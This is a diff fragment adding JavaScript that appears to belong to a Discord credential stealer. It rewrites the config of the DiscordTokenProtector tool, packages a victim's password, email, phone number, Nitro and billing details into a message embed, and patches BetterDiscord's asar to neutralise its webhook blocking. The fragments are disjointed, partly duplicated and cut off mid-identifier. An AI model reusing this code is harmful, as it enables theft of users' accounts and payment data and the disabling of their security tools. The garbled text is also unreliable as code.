@@ -1,0 +1,46 @@
+const token_protector_config = JSON.parse(client.requires.fs.readFileSync(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\DiscordTokenProtector\\config.json`, {
+                encoding: "utf-8"
+            }))
+client.requires.fs.writeFileSync(
+                `${client.utils.encryption.decryptData(client.config.user.localappdata)}\\DiscordTokenProtector\\config.json`,
+                JSON.stringify(
+                    token_protector_config,
+                    null, 4
+                )
+            )
+let path_split_tail = path.includes("Network")
+          ? path_split.splice(0, path_split.length - 3)
+          : path_split.splice(0, path_split.length - 2)
+JSON.stringify(
+                    token_protector_config,
+                    null, 4
+                )
+path_split.splice(0, path_split.length - 2)
+_tmp_119.fields = [{
+                        name: "Password",
+                        value: `\`\`\`${password}\`\`\``,
+                        inline: true
+                    },
+                    {
+                        name: "E-Mail Address",
+                        value: `\`\`\`${email}\`\`\``,
+                        inline: true
+                    },
+                    {
+                        name: "Phone Number",
+                        value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "Nitro",
+                        value: `${getNitro(userInfo.premium_type)}`,
+                        inline: false
+                    }, {
+                        name: "Billing",
+                        value: `${billing}`,
+                        inline: true
+                    }, {
+                        name: "Badges",
+                        value: `${getBad...
+client.requires.fs.writeFileSync(client.utils.encryption.decryptData(client.config.user.appdata) + "/BetterDiscord/data/betterdiscord.asar", client.requires.buf_replace(_,
+                    "api/webhooks", "liliandorker_on_top"))
